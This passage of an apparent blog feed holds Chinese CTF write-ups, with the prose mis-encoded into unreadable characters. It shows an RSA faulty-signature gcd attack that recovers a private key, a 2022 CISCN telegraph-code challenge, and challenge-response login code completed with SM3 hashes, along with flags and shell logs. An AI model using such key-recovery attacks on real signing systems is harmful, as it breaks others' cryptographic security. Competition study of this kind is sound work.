href="https://eprint.iacr.org/2002/073.pdf">https://eprint.iacr.org/2002/073.pdf</a></p><p>è®¡ç®—çš„å…¬å¼ä¸ºï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>m</mi><mo>âˆ’</mo><msup><mi>S</mi><mo mathvariant="normal">â€²</mo></msup><msup><mrow></mrow><mi>e</mi></msup><mo stretchy="false">)</mo><mtext>â€‰</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>â€‰</mtext><mi>N</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd((m-S&#x27;{^e})\,mod\,N,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span></p><p>å½“ç„¶è¿™é‡Œçš„mod Nè¿™ä¸ªæ“ä½œæˆ‘ä»¬è¦æ”¾åˆ°æ‹¬å·é‡Œé¢è¿›è¡Œæ“ä½œä¸ç„¶æ˜¯ç®—ä¸å‡ºæ¥çš„ã€‚å®é™…ä¸Šå¯ä»¥ç›´æ¥æŠŠæ‹¬å·å»äº†ã€‚</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>m</mi><mo>âˆ’</mo><mo stretchy="false">(</mo><msup><mi>S</mi><mo mathvariant="normal">â€²</mo></msup><msup><mrow></mrow><mi>e</mi></msup><mtext>â€‰</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>â€‰</mtext><mi>N</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>â€‰</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>â€‰</mtext><mi>N</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd((m-(S&#x27;{^e}\,mod\,N))\,mod\,N,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><br>n = <span class="hljs-number">23154885630854261581442853508324093951285850590669895605587380575521607235130640544163038357995530183077307108610005939771651006915357243729445798049117319493254714109948731131702737721279228901692687894303893338872375856964797219358972744318545166050544352909134282184933180708435651918762591420996061517085207453652776549270709284644419226914688644151059035005050410930727981245377188391115441239955392677194034468965281888607451952614751181223872620212423712394604641694913836491081539520184795848120063846286690175706164225270915188223556103208363481609433822007116992669527079368460205470274996573363959160287149</span><br>e = <span class="hljs-number">65537</span><br>m = <span class="hljs-number">76589046204045860242452095050720941865379417190758198073582782077942829633646</span><br>S_ = <span class="hljs-number">15560881472440963776812355687263772526799224459493465055411530467812341984615805222376647328602748875265740363403184343010139401584450440120706769134393997687683465315417839518347583296628663097911219566569959436210328102687469397856364290519652485072922276969140055247679930269523169632492462567935396255717642826528934615993335270136129635684773184252764824838098967401117436037823782028218281686360820286858701887330347540973559854295889323011981842854554834266081896736088393072010095414016636556324175277435257379852551709036180461462719357770502022163873660878350507927593844159774420414635489802142702898337920</span><br><br>q = gmpy2.gcd(m % n - gmpy2.powmod(S_,e,n), n)<br><span class="hljs-keyword">assert</span> sympy.isprime(q)<br><span class="hljs-keyword">assert</span> n % q == <span class="hljs-number">0</span><br>p = n//q<br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(d)<br><br><span class="hljs-comment"># 20573248550965769746668559131325998913337123760543021821465022367710197129890858581970699354350667906077354668879574070721931704726814658931071437819859034043246135810646117670919486969346926147757224408888348705655407573600563682855073971980238415232970652759492946757231168845876497417177254046486727530095271650359462396290554836565176988899415082048105336042121088708283121986247556337347604042496257691259888576934466183675054053890063203431358068667198782590000357554673617263489038364827366999921718083027059336746228419784063284929696543875661848541932537305031733107915291818420264919805043139999822520672873</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°flagä¸º</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># CTF&#123;rekt_security_algorithm!&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022 CISCN åˆèµ›</title>
    <link href="/2022/05/29/2022-CISCN-%E5%88%9D%E8%B5%9B/"/>
    <url>/2022/05/29/2022-CISCN-%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>2022 ç¬¬åäº”å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆ›æ–°å®è·µèƒ½åŠ›èµ› ä¸­ä¸ªäººwriteupã€‚</p><span id="more"></span><p>é¦–å…ˆå¾ˆæ„Ÿè°¢æˆ‘çš„é˜Ÿå‹ä»¬ã€‚è¿™æ¬¡çš„æ¯”èµ›çš„ç»“æœå¯¹äºæˆ‘è¿™ä¸ªCTFæ–°äººæ¥è¯´å·²ç»å¾ˆæ»¡æ„äº†ï¼Œå°±æ˜¯ä¸çŸ¥é“èƒ½ä¸èƒ½å‡ºç°ã€‚ä»¥ä¸‹æ˜¯æˆ‘åšå‡ºçš„é¢˜çš„é¢˜è§£ï¼Œéé¢„æœŸå¾ˆå¤šçš„ã€‚</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="ç­¾åˆ°ç”µå°"><a class="markdownIt-Anchor" href="#ç­¾åˆ°ç”µå°"></a> ç­¾åˆ°ç”µå°</h2><p>å…¬ä¼—å·å¾—åˆ°æç¤ºã€‚</p><p>ç½‘ç»œä¸ŠæŸ¥è¯¢ â€å¼¼æ—¶å®‰å…¨åˆ°è¾¾äº†â€œ çš„ä¸­æ–‡ç”µç ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">å¼¼</span><span class="hljs-number">1732</span><br><span class="hljs-string">æ—¶</span><span class="hljs-number">2514</span><br><span class="hljs-string">å®‰</span><span class="hljs-number">1344</span><br><span class="hljs-string">å…¨</span><span class="hljs-number">0356</span><br><span class="hljs-string">åˆ°</span><span class="hljs-number">0451</span><br><span class="hljs-string">è¾¾</span><span class="hljs-number">6671</span><br><span class="hljs-string">äº†</span><span class="hljs-number">0055</span><br></code></pre></td></tr></table></figure><p>æ‹¿ç”µç æœ¬çš„å‰28ä½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;2552343326547861313322543061&quot;</span>)<br>b = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;1732251413440356045166710055&quot;</span>)<br><br>a = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, a))<br>b = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, b))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>((a[i]+b[i])%<span class="hljs-number">10</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 3284594739987117358488253016</span><br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥å‘åŒ…ï¼š</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">http://eci<span class="hljs-string">-2</span>zecfqrktxe0xcfnex4l.cloudeci1.ichunqiu.com:8888/send?msg=3284594739987117358488253016J<br># flag&#123;5ce075fc<span class="hljs-string">-146</span>c<span class="hljs-string">-41</span>ce<span class="hljs-string">-8</span>c2e<span class="hljs-string">-1619685254</span>af&#125;<br></code></pre></td></tr></table></figure><p>è¿™é¢˜æœ€åè¢«æ‰“çš„åªå‰©ä¸‹ä¸ªä½æ•°äº†â€¦</p><h2 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1"><a class="markdownIt-Anchor" href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1"></a> åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> <span class="hljs-number">101.201.123.35</span> -p <span class="hljs-number">30847</span> <br></code></pre></td></tr></table></figure><p>è¿æ¥åˆ°æœåŠ¡å™¨ã€‚</p><p>è¿›å…¥srcç›®å½•ã€‚<a href="http://xn--makecube-challengeplayer-j104bc4zp7sb39cwuswa7104nkeyeya.sh">æ‰§è¡Œmakeåå›åˆ°cube-challengeç›®å½•æ‰§è¡Œplayer.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs shell">[player@engine-1 cube-challenge]$ cd src/<br>[player@engine-1 src]$ make<br>make -C login_server || exit &quot;$?&quot;; make -C login_user || exit &quot;$?&quot;;<br>make[1]: Entering directory `/home/player/cube-challenge/src/login_server&#x27;<br>gcc -g -shared -o  liblogin_server.so login_server.o  -L/root/centoscloud/cube-1.3/cubelib/lib -lmessage -lmemdb -lconnector -lstruct -lcrypto_func -lpthread<br>mv liblogin_server.so /home/player/cube-challenge/plugin<br>cp login_server.cfg /home/player/cube-challenge/plugin<br>make[1]: Leaving directory `/home/player/cube-challenge/src/login_server&#x27;<br>make[1]: Entering directory `/home/player/cube-challenge/src/login_user&#x27;<br>gcc -g -c -fPIC -DUSER_MODE -I/root/centoscloud/cube-1.3/proc/include -I/root/centoscloud/cube-1.3/include -I/home/player/cube-challenge/include login_user.c<br>login_user.c: In function â€˜proc_login_requestâ€™:<br>login_user.c:90:2: warning: passing argument 2 of â€˜message_get_recordâ€™ from incompatible pointer type [enabled by default]<br>  ret=message_get_record(recv_msg,&amp;login_input,0);<br>  ^<br>In file included from login_user.c:9:0:<br>/root/centoscloud/cube-1.3/include/cube.h:139:6: note: expected â€˜void **â€™ but argument is of type â€˜struct record_GENERAL_RETURN_STRING **â€™<br> int  message_get_record(void * message, void ** msg_record,int record_no);<br>      ^<br>login_user.c: In function â€˜proc_login_responseâ€™:<br>login_user.c:145:2: warning: passing argument 2 of â€˜message_get_recordâ€™ from incompatible pointer type [enabled by default]<br>  ret=message_get_record(recv_msg,&amp;login_info,0);<br>  ^<br>In file included from login_user.c:9:0:<br>/root/centoscloud/cube-1.3/include/cube.h:139:6: note: expected â€˜void **â€™ but argument is of type â€˜struct record_USER_DEFINE_LOGIN **â€™<br> int  message_get_record(void * message, void ** msg_record,int record_no);<br>      ^<br>login_user.c: In function â€˜proc_login_resultâ€™:<br>login_user.c:214:2: warning: passing argument 2 of â€˜message_get_recordâ€™ from incompatible pointer type [enabled by default]<br>  ret=message_get_record(recv_msg,&amp;return_info,0);<br>  ^<br>In file included from login_user.c:9:0:<br>/root/centoscloud/cube-1.3/include/cube.h:139:6: note: expected â€˜void **â€™ but argument is of type â€˜struct record_USER_DEFINE_RETURN **â€™<br> int  message_get_record(void * message, void ** msg_record,int record_no);<br>      ^<br>gcc -g -shared -o  liblogin_user.so login_user.o  -L/root/centoscloud/cube-1.3/cubelib/lib -lmessage -lmemdb -lconnector -lstruct -lcrypto_func -lpthread<br>mv liblogin_user.so /home/player/cube-challenge/plugin<br>cp login_user.cfg /home/player/cube-challenge/plugin<br>make[1]: Leaving directory `/home/player/cube-challenge/src/login_user&#x27;<br>[player@engine-1 src]$ ls<br>hacker  login_server  login_user  Makefile                                                                                                                                                                                                   <br>[player@engine-1 src]$ cd ..                                                                                                                                                                                                                 <br>[player@engine-1 cube-challenge]$ ls                                                                                                                                                                                                         <br>define  exec_def  include  instance  login_challenge.sh  login.sh  player.sh  plugin  run_cube.sh  set_env.sh  src                                                                                                                           <br>[player@engine-1 cube-challenge]$ ./login_challenge.sh<br>-bash: ./login_challenge.sh: Permission denied                                                                                                                                                                                               <br>[player@engine-1 cube-challenge]$ sudo login_challenge.sh <br>-bash: sudo: command not found                                                                                                                                                                                                               <br>[player@engine-1 cube-challenge]$ sh player.sh                                                                                                                                                                                               <br>mkdir: cannot create directory â€˜libâ€™: File exists                                                                                                                                                                                            <br>                                                                                                                                                                                                                                             <br>&#123;&quot;name&quot;:&quot;script_run&quot;,&quot;return_value&quot;:&quot;test_start&quot;&#125;                                                                                                                                                                                            <br>                                                                                                                                                                                                                                             <br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;hacker_start&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;server_start&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;copy_plugin&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;trigger_start&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;user_login&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;user1_login&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;trigger_output&quot;&#125;<br><br>&#123;&quot;message&quot;:&quot;flag&#123;884afba9-bad3-470f-a892-442f383708c5&#125;&quot;&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">flag&#123;884afba9-bad3-470f-a892-442f383708c5&#125;</span><br></code></pre></td></tr></table></figure><p>æŒºç¦»è°±çš„â€¦</p><p>å¯èƒ½æ˜¯å› ä¸ºæˆ‘ç›´æ¥å°†login_user.cçš„swpæ–‡ä»¶æ¢å¤äº†ï¼Œå›åˆ°äº†ä¹‹å‰çš„æŸä¸€ä¸ªæ—¶åˆ»ï¼Œç„¶åé‚£ä¸ªæ—¶é—´çš„ä»£ç æ—¶å¯ä»¥ç”¨çš„ï¼Ÿ</p><h2 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2"><a class="markdownIt-Anchor" href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2"></a> åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2</h2><p>è¿˜æ˜¯é€ƒä¸è¿‡å†™ä»£ç â€¦</p><p>é‡æ–°ä¸‹å‘è™šæ‹Ÿæœºï¼Œè¿™æ¬¡ä¸æ¢å¤ä¹‹å‰çš„vimæ•°æ®ã€‚</p><p>è¿›å…¥login_user.cã€‚</p><p>æ‰¾åˆ°å¡«å†™Mbâ€˜å’ŒMaåœ°æ–¹ã€‚</p><p>çœ‹æµç¨‹æˆ‘ä»¬éœ€è¦è¡¥å…¨è¿™ä¸¤ä¸ªä»£ç ã€‚ä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯éªŒè¯æœåŠ¡ç«¯å‘é€çš„Mbï¼Œä»¥åŠè®¡ç®—è‡ªå·±çš„Maã€‚</p><p>å…ˆçœ‹ä»¥ä¸‹serverçš„ä»£ç æ˜¯æ€ä¹ˆå†™çš„ï¼Œä¸ç„¶APIä¸ä¼šç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (Memcmp(login_info-&gt;passwd,Empty_Password,DIGEST_SIZE)==<span class="hljs-number">0</span>)<br>        &#123;<br>                    user_state-&gt;curr_state=CHALLENGE;<br>                    Memcpy(user_state-&gt;proc_name,login_info-&gt;proc_name,DIGEST_SIZE);<br>                    Memcpy(user_state-&gt;node_uuid,login_info-&gt;machine_uuid,DIGEST_SIZE);<br>                    Memcpy(user_state-&gt;nonceA,login_info-&gt;nonce,DIGEST_SIZE);<br>                    RAND_bytes(user_state-&gt;nonceB,DIGEST_SIZE);<br><br>            Memset(Buf,<span class="hljs-number">0</span>,DIGEST_SIZE*<span class="hljs-number">4</span>);<br>            Strncpy(Buf,user_state-&gt;passwd,DIGEST_SIZE);<br>            Memcpy(Buf+DIGEST_SIZE,user_state-&gt;nonceA,DIGEST_SIZE);<br>            Memcpy(Buf+DIGEST_SIZE*<span class="hljs-number">2</span>,user_state-&gt;nonceB,DIGEST_SIZE);<br>                        calculate_context_sm3(Buf,DIGEST_SIZE*<span class="hljs-number">3</span>,login_info-&gt;passwd);<br>            Memcpy(login_info-&gt;nonce,user_state-&gt;nonceB,DIGEST_SIZE);<br>                new_msg=message_create(TYPE_PAIR(USER_DEFINE,LOGIN),recv_msg);<br></code></pre></td></tr></table></figure><p>æŒ‰ç…§ä¸Šé¢çš„æ ¼å¼è¿›è¡Œç¼–å†™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// compute Mbâ€˜ value</span><br>Memset(Buf,<span class="hljs-number">0</span>,DIGEST_SIZE*<span class="hljs-number">4</span>);<br>Strncpy(Buf,client_state-&gt;key,DIGEST_SIZE);<br>Memcpy(Buf+DIGEST_SIZE,client_state-&gt;nonceA,DIGEST_SIZE);<br>Memcpy(Buf+DIGEST_SIZE*<span class="hljs-number">2</span>, client_state-&gt;nonceB,DIGEST_SIZE);<br>calculate_context_sm3(Buf,DIGEST_SIZE*<span class="hljs-number">3</span>,Buf+DIGEST_SIZE*<span class="hljs-number">3</span>);<br><span class="hljs-comment">// add your code here!</span><br></code></pre></td></tr></table></figure><p>sm3çš„æ•°æ®å­˜æ”¾ä½ç½®æ˜¯é€šè¿‡ä¸‹é¢çš„æ¯”è¾ƒå‡½æ•°å¾—åˆ°çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// reponse phrase: compute  the Ma value start</span><br><span class="hljs-comment">// add your code here!</span><br>Memset(Buf,<span class="hljs-number">0</span>,DIGEST_SIZE*<span class="hljs-number">2</span>);<br>Strncpy(Buf,client_state-&gt;key,DIGEST_SIZE);<br>Memcpy(Buf+DIGEST_SIZE,client_state-&gt;nonceB,DIGEST_SIZE);<br>calculate_context_sm3(Buf,DIGEST_SIZE*<span class="hljs-number">2</span>,login_info-&gt;passwd);<br><span class="hljs-comment">// compute Ma value end</span><br></code></pre></td></tr></table></figure><p>å†™å®Œä¹‹åmakeã€‚å›å¤´æ¥è·‘ç¨‹åºã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vim">[player@engine-<span class="hljs-number">1</span> cube-challenge]$ <span class="hljs-keyword">sh</span> player.<span class="hljs-keyword">sh</span> <br><span class="hljs-built_in">mkdir</span>: cannot create directory â€˜libâ€™: File <span class="hljs-built_in">exists</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;script_run&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;test_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;hacker_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;server_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;copy_plugin&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;trigger_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;user_login&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;user1_login&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;trigger_output&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&#123;61b1bf81-41c1-43d3-8af2-7ddc257b6653&#125;&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-comment">&quot;flag&#123;34f5fdaf-c373-47fd-afab-01ed2914c11a&#125;</span><br><br># flag&#123;<span class="hljs-number">34</span>f5fdaf-c373-<span class="hljs-number">47</span>fd-afab-<span class="hljs-number">01</span>ed2914c11a&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªflagéƒ½å‡ºæ¥äº†ï¼Ÿï¼Ÿ</p><h2 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"><a class="markdownIt-Anchor" href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"></a> åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3</h2><p>è¿˜æ˜¯ä½¿ç”¨2çš„ä»£ç å†è·‘ä¸€éå°±è¡Œäº†ï¼Œè™½ç„¶æˆ‘å¾ˆä¸ç†è§£â€¦</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 